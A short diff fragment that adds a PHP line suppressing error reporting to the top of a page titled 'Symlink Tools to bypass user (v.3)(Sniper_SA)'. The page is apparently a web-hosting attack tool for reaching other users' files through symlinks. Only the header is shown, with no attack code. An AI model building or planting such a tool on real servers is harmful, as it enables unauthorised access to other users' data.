@@ -1,3 +1,6 @@
+<?php
+error_reporting(0);
+?>
 <title>[Symlink Tools to bypass user](v.3)(Sniper_SA)</title>
 <body bgcolor="#000000">
  <style>
